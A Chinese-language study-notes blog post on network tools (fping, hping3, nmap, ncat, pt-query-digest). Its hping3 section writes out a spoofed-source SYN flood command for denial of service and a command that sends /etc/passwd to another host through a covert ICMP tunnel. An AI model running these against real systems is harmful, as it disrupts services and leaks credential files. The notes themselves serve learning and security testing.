[(网络学习)5、iptables防火墙与网络攻击](https://segmentfault.com/a/1190000021427869)
====

1、a.fping：批量ping主机
----
fping类似于ping。
```markdown
fping -a[--alive] -f[ --file FILE] -g[--generate生成字符串、域列表]
-a：只显示存活主机；
-u：只显示不存活主机；
-l：循环ping
-g：通过指定起始地址与终止地址产生目标列表
fping -a -g 192.168.1.0/16
```
2、hping：高级tcp探测
----
hping是安全审计、防火墙测试等工作的标配工具。中文说明参考：[hping3 工具说明](https://blog.csdn.net/kernel_1984/article/details/88632230)
```markdown
hping3 host [options]
-p: 端口
-S: 设置tcp模式的syn包
-a: 伪造ip地址
-V  --verbose   详细模式
```
拒绝服务攻击
```markdown
使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。

hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```
文件传输
```markdown
Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：

hping3 192.168.1.159--listen signature --safe --icmp

监听ICMP包中的签名，根据签名解析出文件内容。 在发送端使用签名打包的ICMP包发送文件：

hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
```

3、批量主机扫描: nmap、ncat
----
```markdown
nmap -sP 192.168.1.0/24 //扫描存活
-P          icmp扫描            快速有效
-sS         tcp.syn半扫描       高效，不易检测
-sT         tcp扫描             真实，可靠
-sU         udp扫描             有效透过防火墙

nc -vz -w2 192.168.1.112 10-100 //10-100的端口
-w          超时时间
-z          输入输出模式
-v          显示执行过程
-u/t        udp/tcp
```
4、pt-query-digest: MySQL慢查询分析工具
----
[MySQL慢查询分析工具pt-query-digest详解](https://blog.csdn.net/xiaoweite1/article/details/80299754)
```markdown
4.各工具用法简介（详细内容：https://www.percona.com/doc/percona-toolkit/2.2/index.html）
(1)慢查询日志分析统计
pt-query-digest /usr/local/mysql/data/slow.log
(2)服务器摘要
pt-summary 
(3)服务器磁盘监测
pt-diskstats 
(4)mysql服务状态摘要
pt-mysql-summary -- --user=root --password=root 
```
由于pt工具使用需要本地 sql.log 文件的读取，所以要对不同容器的日志文件进行映射测试。


```markdown
fping -a[--alive] -f[ --file FILE] -g[--generate生成字符串、域列表]
fping -a -g 192.168.1.0/16
```
